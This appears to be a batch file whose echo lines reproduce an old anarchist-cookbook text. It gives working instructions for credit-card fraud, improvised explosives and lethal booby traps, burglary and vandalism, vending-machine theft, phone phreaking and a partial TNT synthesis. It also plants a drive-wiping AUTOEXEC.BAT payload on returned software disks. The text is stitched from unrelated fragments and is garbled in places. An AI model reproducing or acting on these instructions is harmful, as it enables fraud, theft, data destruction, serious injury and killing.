echo Not everyone can order $1000's of stuff - it's not easy. You have to be cool, smooth and have some good answers to their questions. I advise 
echo that you only order up to $500 worth of stuff in one go, but if you have details 1-6 and the phone number will NOT be answered from 9 to 5.30 
echo P.M. then go up to $1000 (make sure it's a GOLD card). When getting ready to order make sure you have at least 3 times the amount of 
echo suppliers you need e.g. if you want to card 5 hard-drives, make sure you have 15 suppliers. A lot of the time, they are either out stock, can't do 
echo next day delivery or won't deliver to a different address. Quick check list of what you must ask before handing over number:
echo 1.Next day delivery, OK?
echo 2.Ordered to different address to card, OK?
echo 3.Do you have item in stock (pretty obvious, eh?)
echo Make sure you ask ALL of these questions before handing over your precious number.
echo Excuses
echo Usual excuses for a different address are that it's a present or you're on business here for the next 5 weeks etc. Any old bullshit why it won't
echo go to the proper address.
echo WARNING WARNING
echo Invoices are sometimes sent out with the actual parcel but they are also sent out to the card owners (why do you think they need the address 
echo for?) so using a safehouse for more than 2 days is risky. A 1 day shot is safe, if they catch on then they'll stop the goods before getting a 
echo search warrant.
echo Credit Limits
echo Limits on cards reach from $500 to $4000 on Gold cards. Your average card will be about $1000-$1500. It takes a while to build up a good 
echo credit rating in order to have large limits so don't think every card will hold 12 IBM 386's Visa and Access are always used - American 
echo Express etc. are USELESS.
echo · Access = Eurocard, Mastercard (begins with 5)
echo · Visa = (begins with 4, 16 digit is a Gold)
echo A general rule is, always confirm an order to make sure credit is cleared. As the month goes on, credit is used up - the bad times are from 27th 
echo - 3rd which is when all the bills come in. Best time to card is around 11th or 12th, when the poor guy has paid off his last bill so you can run up 
echo a new one (he, he, he).
echo Ideal items to card
echo The best stuff is always computer hard-ware as it's next-day. Amigas, ST's, PC's - anything really. Blank discs are a waste of time, they're too 
echo heavy. External drives, monitors - good stuff basically. Don't order any shit like VCR's, Hi-Fi, video-cameras, music keyboards, computer 
echo software, jewerely or anything under $300. You'll find the listed items are difficult to get next day delivery and usually won't deliver to a 
echo different address - bastards, eh? You're wasting your time with little items under $300, try to keep deliveries under 10 a day.
echo The drop - Two ways of doing the drop
echo 1.Sign for all the gear (make sure you're there between 9.00 and 5.30 P.M.)
echo 2.Don't turn up till around 6.30 P.M. and collect all the cards that the delivery man has left. These usually say 'you were out at XX time so could 
echo you please arrange new time for delivery or pick up from our depot'. In that case, piss off to the depot and get all the gear (need a big 
echo car).
echo Remember, carding is ILLEGAL kiddies, so don't get caught.

echo 167.Potassium Bomb by Exodus
echo This is one of my favorites. This creates a very unstable explosive in a very stable container. You will need:
echo 1.A two-ended bottle. These are kinda hard to find, you have to look around, but if you cant find one, you will need a similar container in which 
echo there are two totally separate sides that are airtight and accessible at the ends, like this:
echo 
echo _________________________________
echo | | |
echo / | \
echo ---- | ----
echo | c | | |c |
echo | a | | | a | 
echo |___p| | |__p_|
echo \ | /
echo | | |
echo -----------------|------------------
echo the separator MUST remain airtight/watertight so this doesn't blow off your arm in the process (Believe me. It will if you are not exact.)
echo 2.Pure potassium. Not Salt Peter, or any shit like that. This must be the pure element. This again may prove hard to find. Try a school chemistry 
echo teacher. Tell her you need it for a project, or some shit like that. Try to get the biggest piece you can, because this works best if it a solid 
echo chuck, not a powder. You can also try Edmund Scientific Co. at:

echo C929 Edscorp Bldg.
echo Barrington, NJ 08007
echo or call 1-(609)-547-8880
echo 3.Cotton
echo 4.Water
echo Instructions:
echo Take the cotton and stuff some into one end of the container lining one side of the separator. Place some potassium, about the size of a quarter 
echo or bigger (CAREFULLY, and make sure your hands are PERFECTLY DRY, this stuff reacts VERY VIOLENTLY with water) into that side and 
echo pack it in tightly with all the cotton you can fit. Now screw the cap on TIGHTLY.
echo On the other side of the separator, fill it with as much water as will fit, and screw that cap on TIGHTLY. You are now in possession of a 
echo compact explosive made somewhat stable. To explode, throw it at something The water will react with the potassium, and
echo BBBOOOOOOMMMM Works great on windows or windshields, because the glass fragments go everywhere (stand back) and rip stuff apart. 
echo The bigger the piece, the bigger the boom. If no potassium can be found, try looking for PURE Sodium, it works well too.
echo PS: You could also place this little sucker under the wheel of a car of someone you hate...(Wait till' they back over that one)

echo with a crime punishable by a term in a reform school or juvenile detention facility, he is assured the right to:
echo 1.Remain silent, and not incriminate himself/herself.
echo 2.Be placed in quarters separate from adult offenders while being held in custody.

echo 170.Down the Road' Missile by Exodus
echo This missile is aptly named because it travels best down a street or road. This is nothing more that harmless phun intended to scare the living 
echo shit out of oncoming cars. 
echo How To Make A Missile
echo All you need are:
echo · Hairspray can, or something else with flammable propellant (don't use spraypaint dipshit, it makes a big mess)
echo · book of ordinary matches
echo · tape (clear if possible, its thinner)
echo · BB or pellet gun (use BB's if possible)
echo Instructions:
echo Tape the book of matches to the bottom of the can, y'know, the CONCAVE part. You might want to arrange the matches so that they are 
echo spread over a wide area of the bottom of the can, but close together.
echo Shake the can up vigorously. Now place the can on its side with the nozzle of the can pointed in the direction you want it to go, down a road, 
echo off a ramp, at your sister, etc.. Now stand back a bit, and shoot at the matches. It should take off at about 30 ft per sec What happens in 
echo case you couldn't tell, is the BB hits the matches and causes a spark, and at roughly the same time, punctures the weak bottom of the can. As 
echo the propellant sprays out, it hopefully comes in contact with the spark, and presto. If you don't do it right you'll blow a lot of money because 
echo each can only be used once, so experiment to find best results.
echo In The Air Missile:
echo Compile the rocket as stated before, and put it vertical on a stand of some sort with the bottom accessible. Place a section of PVC pipe 95ø 
echo preferred and shoot into the PVC pipe which should direct the BB upward, and the can should take off. Experiment w/ different cans, its hard 
echo to find ones that work perfectly, and still go higher than 30 ft.

echo 171.Phun With Shotgun Shells by Exodus
echo This phile is for those have no concern for themselves or the person they wanna fuck over with this. (in short, a fucking MANIAC)
echo DoorBlams
echo Shotgun shells are wonderful. They can be used in almost any situation where pain or amputation of limbs is concerned (including your own if 
echo you are not EXTREMELY careful. The best way to use shells, is the DoorBlam. The DoorBlam is a simple concoction of a shell taped to the back 
echo of a door with the ignition button facing away from the door (so it blows out against the door). Now position it somewhere where it will do the 
echo damage you want. i.e.- near the top for decapitation, middle for slow death, or low to make the victims kneecaps fly across the room. Now 
echo tape a thumbtack against a wall or something that that part of the door bumps up against. Tape it to the wall so that the point pokes through the 
echo tape, and position it so it will hit the ignite button upon impact... Its that simple. Instant pain
echo Long Range Explosives
echo These are THE most difficult explosive I have ever tried to make (people I know have lost fingers and hands to this little fucker) IF you have a 
echo VVVVERY still hand, it might be accomplished. Ignite buttons usually take some force to make it blow, so CAREFULLY and LIGHTLY push a tack 
echo through tape and tape it to the back of the shell, with the tip of the tack LIGHTLY touching the button. Add more tape to the back to hold the pin 
echo in place. If you still have hands at this point, consider yourself lucky. Now you need to add a weight to the tack-end part to make sure it hits the 
echo ground first. Taping small rocks or making the shell by putting heavy loads towards the button helps. Placing a cracker (yes a cracker (Saltines, 
echo anyone ?)) between the tack-point and the button helps prevent detonation upon THROWING, which DOES happen. Now toss it up high and 
echo AWAY from you, and RUN LIKE SHIT does after you eat Mexican.

echo 173.Drip Timer by Exodus
echo Another method of time delay for explosives that are detonated by electric means, is the drip timer. Fill a 'baggy' with water and then add as 
echo much salt as the water will hold. Seal it, leaving some air inside. Then, tape the two contact wires from which the circuit has been broken, to 
echo the inside of a large cup. Place the baggy on the cup. Poke a hole in the top of the 'baggy', where there is air, and then make a hole in the 
echo bottom to let the water drain into the cup. As any Einstein figures, the salt water level in the cup will eventually conduct electricity at the
echo moment both wires touch water, thus completing the circuit. I have yet to try this timer out, and I got the plans from a total idiot, phreaker 
echo nonetheless, and doubt it would work with any power source under 12v.

echo 174.Stealing by Exodus
echo It is strange just how many files there are out there that try to document the art of stealing. After all, it IS an art. You have to be calm, smooth, 
echo persistent, patient. Stealing is not an overnight-planned operation. You should try to prepare for at least a week or more when planning to steal 
echo from a house, and even LONGER when from a business. Story time, kiddies:
echo A long time ago, well, in the past year, my friends and I noticed that the building complex in our town was the perfect place to obtain unpaid-for 
echo items. We learned all we could about the complex, which was about 365,000 sqft, and each company consisted of an office (fully furnished 
echo with cool computer stuff), and a 10,000 sqft (roughly) warehouse, all interconnected, and all one level. This information was obtained through 
echo several calls to the town committee (board of development, or some shit like that, the place that you call for building permits, and the like.), and 
echo we obtained the blueprints for the whole complex. We planned a route from the side entrance through the warehouse, and into the offices, 
echo where all the good stuff is usually located. Now that we had our route, all we needed was a plan to get inside. Since this was our first major 
echo job, we spent a few good weeks on preparation. During the snow weather, we worked w/ a company to shovel the sidewalks of the 
echo complex. One night, at about 11 PM, we stopped shoveling in front of our planned job site, Campbell's Soup, Co. There was nobody there 
echo except the janitors that cleaned up the place (or so we thought). I asked the janitor if I could use the bathroom (I did have to go too) and he let 
echo me in. I must have surprised him when I knew exactly where the bathroom was As I walked to it, I scanned for video cams, infrared 
echo guns/receivers (little boxes at entrances with a black glass square about 1" sq. at about knee height on each side). Nothing. The doors all had 
echo security magnetic detection at the tops, and also the windows. To think someone would break in through an obvious place like a large window, 
echo stupid. To my surprise, there were a few losers working late, and didn't really care that I was there at all. Take another Viverin' guys, I won't 
echo be here long. The smell of black coffee was stifling. The bathroom was located back by the office's entrance to the warehouse, and to my 
echo surprise, it was unlocked The lights were on, and the place was totally empty, except for a few cardboard remains, and shelves, and that 
echo blessed side door. I walked over to the door to examine it. No security, no video cams in the warehouse, no nothing. Odd, usually these 
echo warehouses were kept tight as a hookers pussy. But it looked like they were packing up to move somewhere. Boxes on the office desks, etc.. 
echo The door was locked with a key deadbolt (pain to pick) and a regular door-knob key lock. No problem. I needed to stop that deadbolt from being 
echo locked, so I looked around for something to use....aha There was some strange material like alum. foil on the ground, pliable, yet of a black 
echo color. I took out a small allen key (a thief never goes ANYWHERE without a small lockpicking tool) and crammed enough of the stuff into the 
echo keyhole so that a key could not be inserted far enough to turn, and the stuff was in to far to be pulled out. Viola Back to the point of this story. 
echo When the time came to make our move, something strange happened. The place was abandoned for 3 days straight, most office equipment 
echo removed, and the front door left ajar, for all 3 days. We still decided to enter via our planned route. At 1:30 AM we went to the side door, and 
echo what a surprise, the deadbolt lock was open. Now to the knob lock. It was still locked, but not a problem. Knob locks usually look like this:
echo  |-wall socket>
echo  --------------------------
echo  | )
echo  d -------------------------------|
echo  o | |
echo  o | )
echo  r | )
echo  | )
echo  -------------------------
echo  |
echo  |-wall socket>
echo The top sliding piece is about ¬" wide on popular locks, with the bar facing you, if the door swings outward. With the smallest allen key you 
echo can get, stick it in and repetitively push and slide it back towards the knob, but don't let go, because it is spring loaded and will snap back into 
echo place again. Now for the larger bar. Take another key and wedge it into the slot where the bar enters the 
echo other wall (without the knob on it) and do the same thing. This will be considerably harder to do than with the small tongue, but if you practiced 
echo like you should have, it will open with minimum effort. Now we were inside. We ran through the warehouse though the warehouse/office door 
echo (these are rarely locked, but try to prepare for it ahead of time by "cramming the lock" like I did) and into the office. The place was empty, no 
echo shelves, just desks, chairs, and boxes. The boxes contained modems, motherboards, bus cards, printers, cables, fone cable, and one 
echo contained a Zenith laptop computer We took everything we could carry (5 people). We took all the above 
echo mentioned, as well as printer toner, fones, fone jacks, documents, desk chairs, insulated boxes and bags (static-free kind), even the little shit 
echo things, like outlet plates, light bulbs, ANYTHING We went really crazy, and were out in 2 min 30 sec.(always set a time limit) 
echo We wound up throwing half the shit away, but it felt great just to take anything that was not ours I have since then done other "jobs" with 
echo much more precision, and effort, as well as better rewards. Here are some tips that should be followed when attempting to steal:
echo · WEAR GLOVES
echo · Backpacks for everyone to put the loot in.
echo · Always cas e the joint for at least a week and keep documented records of who leaves when, what time it closes, timed lights, etc...
echo · Have at least 4 phriends with you, and ,please, make sure they know what they are doing, no idiots allowed
echo · Bring tools :small allen keys, both types of screwdrivers, standard size, and tiny, hacksaw blade, wire cutters and strippers, spraypaintto leave your handle on the wall, hammer, mace, gun-if available, flashlights (duh), wire-good for re-routing door security, and bolt 
echo cutters.
echo · Designate a person to carry all the tools ONLY-don't have him pickup stuff and mix it with the tools, this will only slow you down later if 
echo you need to look fir a tool quickly.
echo · Designate a person to STAY PUT by the door and keep watch.
echo · Designate a timer, one who has a lighted stopwatch.
echo · Make runs NO LONGER THAT 3 MIN. EVEN THIS TIME IS EXTREMELY HIGH-TRY TO KEEP AS LOW AS POSSIBLE.
echo · Getaway vehicle (preferably NOT a van or pickup truck, these will be very suspicious to the pigs..er.I mean cops. And don't speed, or 
echo anything, this just attracts attention. Cover license plates till just before you get your asses going, so no one can report the plates to the 
echo pigs..oops, damn, did it again, cops. Make sure you remove covering before leaving.
echo · Always keep flashlights pointed DOWN unless necessary, crawl under windows, no shouting, even if you find some phucking cool shit, 
echo on second thought, maybe painting your handle is a little stupid, so forget that, wear dark clothes OVER regular, non-suspicious clothes 
echo (get changed first thing in the car)
echo · Never brag about your findings in public, only on modem, or on BBS, and never give names of places, phriends, and exact names of 
echo things taken, (just say you 'borrowed' a 486DX 33 motherboard, don't say is a Intel 486DX 33 MHz for an IBM PS/1 model 50, serial 
echo #XXXXXXXXXXXX. that is just plain dumb)
echo · Have phun and never steal from your neighborhood. 
echo · If you break into houses, never move stuff around; the longer it takes the yuppie family to realize that you were there, the better.
echo · WEAR GLOVES
echo · To get in windows: shoot window with BB gun, and place clear, sticky hard-cover book covering on the window over the hole, hopefully 
echo the impact of the shot was enough to crack the glass, and LEAN OR PUSH on the covered glass, do not hit or kick, and you will see that 
echo the majority of the glass will stick to the covering, and will make considerably less noise.
echo · Enter through basement windows preferably under a deck or steps.
echo · MAKE SURE THE PEOPLE WILL BE GONE FOR THE NIGHT AND THE NEIGHBORS ARE ASLEEP (GO FOR AROUND 2:30 AM)
echo · Take stuff that will sell easily to friends, and don't waste time taking things that look neat, just take the basics: electronic, computer, TV, 
echo VCR, some jewelry-things you could easily hock, preferably without inscriptions, raid the fridge, take good quality fones, stereo equip., 
echo speakers, etc..
echo · Always case the outside of the house looking for security stickers that yuppie families like to place in full view.
echo · Do mischievous shit like cut all fone lines in house, cut up couch cushions, and flip them over so they look perfectly normal; shoot a hole 
echo in their fish tank, (all yuppies own fish); slash clothes, then put them back into the drawer; unplug fridge; set thermostat way up to 99.9ø; 
echo leave drain plugged and let the faucet run just a little, (for 6 hours); whatever you can't take or carry out, destroy in a subtle way, -if you 
echo can't carry out those 130 lb. wood case stereo speakers, slash the cones; break ball-point pens open and rub them into the carpet with 
echo their shoes; run a magnet over audio and VCR cassettes and floppies, and anything else subtle that would brighten their day.

echo 175.MISCELLANEOUS INFORMATION by Exodus
echo Easy explosive:
echo · Fill Kodak film case (y'know, the black cylinder with the gray cap) with explosive of your choice. Drill hole in gray lid, insert fuse, and tape 
echo it back together very tightly. Light.
echo  -or-
echo · Poke a hole it the gray cap facing outwards, and insert an M-80 with fuse going through the hole and reseal, taping it tightly ALL AROUND 
echo the case. Place in plastic mailbox, light, close door, and get the hell away Because of the tight airspace, the destructive power of the 
echo explosion is increased 5X. Works under water too, with a drop of wax, or preferably rubber cement around where the cap and wick 
echo meet.
echo  
echo  -and-
echo · Fill a GLASS coke/pepsi bottle with 1 part gas, 1 part sugar, and 1 part water. Wedge an M-80 into the top about halfway. Shake the 
echo container, place in mailbox (hopefully with mail {hehe}) light, and get the fuck away. This thing sends glass shrapnel EVERYWHERE, 
echo including through their mail.
echo Doorknob Shocker:
echo · Run a wire from one slot in wall outlet to the bracket in the wall that the knob's tongue inserts into. Run another wire from the other slot to 
echo an inconspicuous spot on the DOORKNOB. How does that one *grab* you?

echo Actually, any 1-619-7x9-000x gives tone detect, finding the other silent connection is a wee bit harder. 
echo If anyone manages to complete some of these, or any loops, please let me know.
echo The only bad thing about loop lines, is that eventually the Gestapo finds out about the over-use of the line, and assigns the number to anyone 
echo who wants a new number for their fone. Then when phreaks begin to use the line again, thinking it is a loop, they get a pissed off yuppie who 
echo then has the call traced, and that's like putting your balls right in a door and slamming it. The operator will complain in your face, and say some 
echo bullshit like she has your number and will report any disturbances to the fone co. if she sees it again.
echo Simple Virus/Easy Way To Return A Copied Program (hehe)
echo When you buy a game, or something from a computer store, copy it, and want to return it (I know all of you do this), sometimes all the store 
echo does is re-cellophane it and it goes back on the shelves without being re-tested. If the original floppies have an AUTOEXEC.BAT file on them to 
echo initiate the copying/decompression at boot-up, simply edit it to say:
echo cd\
echo del c:*.*
echo y
echo That'll make someone's day real funny, especially if the store tries to test it. Or, in most cases the store will not accept returned merchandise if 
echo it is not defective, so DEFECT IT. This is done by using a program that shows the date and time the originals were last modified (check for this 
echo BEFORE installing the program) such as DosShell, or XTGold. Then set the date and time on your computer to match the originals date and 
echo time (approx). Install the program, and/or copy the originals and manuals. Now fuck around with the decompression file (usually PKUNZIP), the 
echo installation file, and any others you see. Now the store has no reason, and MUST accept the product as a return, or sometimes they will give 
echo you a return check for the $$, and send the program back to the manufacturer, which is good, because it will then be recopied, resealed, and 
echo put back on the shelves somewhere for another phreaker to HACK
echo (If the above date/time matching is too much of a pain for the really retarded out there, set your computer date/time to any past ones close to 
echo the originals, and fuck with ALL the files, thus making them all match.)
echo Battery Bombs:
echo Batteries like Duracell, Eveready, Energizer, etc... are specially made for home use and will not under any condition, explode when simply 
echo connected to each other. Therefore, generic batteries are required. These batteries can be obtained in hick country, or from a shitty 
echo wholesaler. I've heard of phriends putting 9Vs in the fucking microwave for a minute or so, and this is supposed to disable the "exploder 
echo protector", but anyone who puts batteries in a microwave, should have the batteries explode on them. I never found out if 2 9v batts 
echo connected really do explode. I hope so.
echo Any Blue Boxers??
echo Not many people use blue boxes these days. They've become an eminent danger to phreakers. Ma Bell has new equipment to detect the use of 
echo tone-emitting boxes, and about the only safe place to box calls from is the handy -dandy pay phone at the end of the block. The only way to 
echo box calls today is to switch off to another switching system with another number: i.e.-
echo Call a store like Toys-'R'-Us, (1-908-322-6065 Livingston, NJ) and ask for the technical (video game) department. This switches the number 
echo from the above to the extension of the department, usually and extension, but it can be a totally different # you are sent to while you are on 
echo hold. This is VERY good. Bullshit the employee at the tech dept., and wait for HIM to hang up first. That disconnects you from his department, 
echo but not from the interconnections of the store. (It might even be possible to dial a number and get another department at this point). This is like 
echo 'stacking' trunks. Their dialtone (inside the store) may have a slightly higher/lower pitch than a dialtone at your house. This is what you want. 
echo Now, blow 2600 across the line, and you should have access to a trunk, and Bell Labs think that the store did it, and it is not usually questioned 
echo because the computer might think that it is part of their paging system. (not 100% sure, test around)
echo When someone (preferably who you don't give a shit about) calls, dial *69 to ring him back(If your area subscribes to this feature). What 
echo should happen is that the *69 tone asks the Bell computer to call back the person. The COMPUTER does the calling at this point. Now when 
echo your friend picks up, bullshit him into hanging up first. Now the computer is getting the dialtone first, then it passes it on to you. If you blow 2600 
echo at this point, the computer may think it is its own equipment doing the calling. I'm REALLY not sure about this one. Hopefully this one works, but I 
echo can't test it because some fucked up, shit full, douche nozzle, pig fucker broke my MF box. <frown> MF boxes are not that hard to come by. 
echo Many hobby shops, music instrument stores, or electronic stores may sell the MF box itself, or one that detects tones, which can be used in 
echo the reverse way.
echo Good Technical Phone Numbers:
echo Sometimes the hardest part of getting technical support is finding a place to look. An easy place is MIT (HOME OF THE ORIGINAL PHREAKS) 
echo Find the number for the Electronic engineering campus, call and say you would like the number for (give room # make one up if you have to), or 
echo call the person in charge of dorm assignments (buy a college book if you need to). Eventually, if done right, you will have a list of possible #s, 
echo and set your modem on scan, and look for carrier detect. One of these nerds...ahm I mean Geniuses must have a computer with a modem, and 
echo these guys will answer about 100% of your technical problems.
echo Practical Jokes:
echo If you are into practical jokes like I am, than here is a book for you:
echo "The Second Official Handbook of Practical Jokes"
echo by: Peter Van Der Linden
echo There are hundreds of good practical jokes and phone scams, as well as a section of computer jokes, with a whole program of re-writing the

echo 176.Shaving Cream Bomb by Exodus
echo This may not really be what we would consider a bomb, but it is a helluva great idea to phuck someone over. You will need:
echo · (1) Person you hate who has a car.
echo · (1)-Container of liquid nitrogen (try a science shop, or Edmund Scientific, mentione d in several places in this Cookbook)
echo · (6-10)-Cans of generic shaving cream.
echo · (1)-Free afternoon (preferably in FREEZING temperatures outside)
echo · (1-or more)-Pairs of pliers, for cutting and peeling.
echo · Some phriends.
echo Directions:
echo Find someone who owns a small compact car, and manage to find out where he keeps it at night (or while he is away) Be able to open the car 
echo repeatedly.. Place a can in the liquid nitrogen for about 30 sec. Take it out and carefully and QUICKLY peel off the metal outside container, and 
echo you should have a frozen "block" of shaving cream. (It helps to have more than one container, and more phriends) Toss it into the car and do 
echo the same with all the cans. A dozen or more "blocks" like this can fill and lightly PRESSURIZE a small car. When he opens the door (hopefully he 
echo doesn't realize the mess inside due to the foggy windows), he will be covered with pounds of shaving cream that is a bitch to get out of 
echo upholstery.

echo 177.Another good way to rip off a change or drink machine by ?îd ƒlèsh
echo You first get a nice new dollar to work with. Make sure there are no rips in it. Now, you get a thin piece of transparent plastic about 3/4 the 
echo width of the actual dollar. It must be a good 6" or longer. Next, you need some transparent tape. Scotch magic tape will work the best. You 
echo simply tape the plastic strip to the dollar. But, you must be careful not to tape it more than «" up the side of the dollar. Tape it on both sides 
echo (front and back, not top and bottom) of the dollar. Now, all you have to do is use it:
echo Walk casually up to the secluded machine. Take out your dollar, and put it into the machine. BE CAREFUL Some of the more modern change 
echo machines have alarms Most likely, though, drink or candy machines will not. Now, the machine starts taking your dollar.... You wait until your 
echo plastic strip is almost all the way into the machine, and then you pull with sufficient force to get the dollar out of the machine, but not rip it. If you 
echo did it correctly, you should have gotten whatever you bought, and still have your dollar for later use. On candy machines, though, make your 
echo selection, and then wait and pull the dollar out. Don't worry if you don't get it on the first few tries. It took me about 5 tries to master it. It DOES, I 
echo repeat DOES work for a fact if done correctly. If you just can't get it, though, either the machine is too sophisticated, or you put the tape up too 
echo high on the dollar. Have fun

echo 178.Lockpicking for the EXTREME beginner... by ?îd ƒlèsh
echo This is really a good method for opening doors that are locked. The only problem with this, though, is that it only works for outward opening 
echo doors. OK, here we go....
echo 1.Realize you are not working with the actual lock, but that thing that sticks between the door and the wall.
echo 2.See how that thing is curved on one side? Well, that is what we will be making use of.
echo 3.Acquire a large paper-clip. If it is too short, it won't work. You have to also have a shoelace. Now, onto the construction...
echo 4.Straighten the paper-clip.
echo 5.Loop one end of the paper clip around the shoelace. The shoelace should be about 4/5 on one side of the clip and 1/5 on the other. Let's see 
echo if I can draw it.
echo ------------------*************************************
echo  -*
echo  *******
echo --- is the paper clip
echo *** is the shoelace
echo That's not very good, but I hope you get the picture.
echo 6.All you have to do now is curve the paper clip (no, I won't draw it)
echo 7.With the curved paper-clip, stick it between the door and the wall, behind the metal thing that sticks between. 
echo 8.Feed it through with you hand, until you can grip both sides of the shoelace.
echo 9.Now, simply pull the lace and the door at the same time, and VIOLA the door is open.
echo I prefer this over regular lock-picking if the door opens outward, because it is a lot quicker. Lock picking can take 5 minutes... When done 
echo correctly this only takes 30 seconds So, if you can, use this.

echo FBI raids major Ohio computer bulletin board; action follows joint investigation with SPA.
echo The Federation Bureau of Investigation on Saturday, Jan. 30, 1993, raided "Rusty and Edie's," a computer bulletin board located in Boardman, 
echo Ohio, which has allegedly been illegally distributing copyrighted software programs. Seized in the raid on the Rusty and Edie's bulletin board were 
echo computers, hard disk drives and telecommunications equipment, as well as financial and subscriber records. For the past several months, the 
echo Software Publishers Association ("SPA") has been working with the FBI in investigating the Rusty and Edie's bulletin board, and as part of that 
echo investigation has downloaded numerous copyrighted business and entertainment programs from the board.
echo The SPA investigation was initiated following the receipt of complaints from a number of SPA members that their software was being illegally 
echo distributed on the Rusty and Edie's BBS. The Rusty and Edie's bulletin board was one of the largest private bulletin boards in the country. It had 124 
echo nodes available to callers and over 14,000 subscribers throughout the United States and several foreign countries. To date, the board has 
echo logged in excess of 3.4 million phone calls, with new calls coming in at the rate of over 4,000 per day. It was established in 1987 and had 
echo expanded to include over 19 gigabytes of storage housing over 100,000 files available to subscribers for downloading. It had paid subscribers 
echo throughout the United States and several foreign countries, including Canada, Luxembourg, France, Germany, Finland, the Netherlands, Spain, 
echo Sweden and the United Kingdom.
echo A computer bulletin board allows personal computer users to access a host computer by a modem-equipped telephone to exchange 
echo information, including messages, files, and computer programs. The systems operator is generally responsible for the operation of the bulletin 
echo board and determines who is allowed to access the bulletin board and under what conditions. For a fee of $89.00 per year, subscribers to the 
echo Rusty and Edie's bulletin board were given access to the board's contents including many popular copyrighted business and entertainment 
echo packages. Subscribers could "download" or receive these files for use on their own computers without having to pay the copyrighted owner 
echo anything for them. 
echo "The SPA applauds the FBI's action today," said Ilene Rosenthal, general counsel for the SPA. "This shows that the FBI recognizes the harm 
echo that theft of intellectual property causes to one of the US’s most vibrant industries. It clearly demonstrates a trend that the government 
echo understands the seriousness of software piracy." The SPA is actively working with the FBI in the investigation of computer bulletin boards, 
echo and similar raids on other boards are expected shortly. Whether it's copied from a program purchased at a neighborhood computer store or 
echo downloaded from a bulletin board thousands of miles away, pirated software adds to the cost of computing. According to the SPA, in 1991, 
echo the software industry lost $1.2 billion in the US alone. Losses internationally are several billion dollars more.
echo "Many people may not realize that software pirates cause prices to be higher, in part, to make up for publisher losses from piracy," says Ken 
echo Wasch, executive director of the SPA. In addition, they ruin the reputation of the hundreds of legitimate bulletin boards that serve an important 
echo function for computer users." The Software Publishers Association is the principal trade association of the personal computer software 
echo industry. It's over 1,000 members represent the leading publishers in the business, consumer and education software markets. The SPA has 
echo offices in Washington DC, and Paris, France.

echo 181.ANARCHY 'N' EXPLOSIVES - VOLUME 2 by Exodus
echo This volume defines a few varieties of misc. explosives, charges, and whatever I had in mind at that time. Anyway, these formulas are not as 
echo precise in measurements for they were given in brief summary. However, they will work, and if used correctly can be safe and "fun".
echo FRENCH AMMONAL [Low Explosive]:
echo Ingredients:
echo · 86% Ammonium Nitrate
echo · 6% Stearic Acid
echo · 8% Aluminum Powder
echo Description:
echo French ammonal is an easily improvised low explosive mixture. It is generally less effective than an equal weight of TNT. The material is loaded 
echo by pressing it into a suitable container. Initiation by an Engineer's special blasting cap is recommended.
echo Comments:
echo This material was tested. It is effective.
echo References: 
echo TM 31-201-1, Unconventional Warfare Devices and Techniques, para 1401.
echo TETRYTOL [High Explosive]:
echo Ingredients:
echo · 75% Tetrytol
echo · 25% TNT
echo Description:
echo Tetrytol is a high explosive bursting charge. It is used as a demolition explosive, a bursting charge for mines, and in artillery shells. The 
echo explosive force of tetrytol is approximately the same as that of TNT. It may be initiated by a blasting cap. Tetrytol is usually loaded by casting.
echo Comments:
echo This material was tested. It is effective.
echo References: 
echo TM 9-1900; Ammunition, General, page 55. Military Explosives, page 188.
echo IMPROVISED PLASTIC EXPLOSIVE FILLER [High Explosive]:
echo Ingredients:
echo · Finely Powdered Potassium Chlorate 
echo · Cdata bstals
echo · Petroleum Jelly
echo · **MIX THOUROUGHLY**
echo Description:
echo This plastic explosive filler can be detonated with a No. 8 commercial blasting cap or with any military blasting cap. The explosive must be 
echo stored in a waterproof container until ready to use.
echo Comments:
echo This material was tested. It is effective.
echo References: 
echo TM 31-210, Improvised Munitions, sec I, No. 1.
echo FLAMMABILITY OF GASES [Gas Explosive]:
echo Ingredients:
echo · Explosive Gas
echo Description:
echo Under some conditions, common gases act as fuel. When mixed with air, they will burn rapidly or even explode. For some fuel-air mixtures, the 
echo range over which the explosion can occur is quite wide while for others the limits are narrow. The upper and lower amounts of common fuels 
echo that will cause an ignitable mixture are shown in the table below. The quantity shown is the percentage by volume of air. If the fuel-air mixture 
echo is too lean or too rich, it will not ignite. The amounts shown are therefore called limits of inflammability.
echo Gases (% by volume of air)
echo Fuel (Gas) Lower Limit Upper Limit
echo Water Gas Or Blue Gas 7.0 72
echo Natural Gas 4.7 15
echo Hydrogen 4.0 75
echo Acetylene 2« 81
echo Propane 2.2 10
echo Butane 1.9 9
echo Comments:
echo These fuels have been tested under laboratory conditions. They are effective. Ignition depends on method of initiation, uniformity of mixture, 
echo and physical conditions.

echo 182.ANARCHY 'N' EXPLOSIVES - VOLUME 3 by Exodus
echo This is the MOST important or one of the most important volumes regarding the various mixtures of anarchy that I will be "publishing" to the 
echo "public". Also, it may as well be the MOST DANGEROUS to prepare, the substance we will be dealing with is Trinitrotoluene, or short - TNT. 
echo This high explosive is a VERY DANGEROUS, slightly unstable substance. The crystallized crude TNT is about the color of brown sugar and 
echo feels greasy to the touch. It is suitable for many uses as a high-explosive, but not for the use in high-explosive shells. It is also highly reactive 
echo to many other chemical substances. It can be incorporated into dynamite and many other explosives that will be explained in further detail later, 
echo in other volumes of ANARCHY.
echo WARNING:
echo DO NOT ATTEMPT TO FINISH THIS PROJECT UNLESS YOU ARE FULLY CAPABLE SAFELY EXECUTING THE PROCESSES IN A SAFE
echo ENVIRONMENT IF YOU CHOOSE TO CONTINUE, READ THE INSTRUCTIONS COMPLETELY THROUGH BEFORE BEGINNING AND HAVE ALL 
echo MATERIALS AND TOOLS (INCLUDING SAFETY/EMERGENCY EQUIPMENT) READY FOR USE WHEN OR IF THEY ARE NEEDED. THIS IS NOT A 
echo JOKE
echo Preparation of Trinitrotoluene (Three Stages). A mixture of 294 grams of concentrated sulfuric acid (density 1.84) and 147 grams of nitric acid 
echo (density 1.42) is added slowly from a dropping funnel to 100 grams of toluene in a tall 600-cc. beaker, while the liquid is stirred vigorously with
echo an electric stirrer and it's temperature is maintained at 30øC to 40øC by running cold water in the vessel in which the beaker is standing. The 
echo addition of acid will require from an hour to an hour and a half. The stirring is then continued for half an hour longer without cooling; the mixture 
echo is allowed to stand over night in a separatory funnel; the lower layer of spent acid is drawn off; and the crude mononitrotoluene is weighed. 
echo One-half of it, corresponding to 50 grams of toluene, is taken for the dinitration. The mononitrotoluene (MNT) is dissolved in 109 grams of 
echo concentrated sulfuric acid (d. 1.84) while the mixture is cooled in running water. The solution in a tall beaker is warmed to 50ø and a mixed 
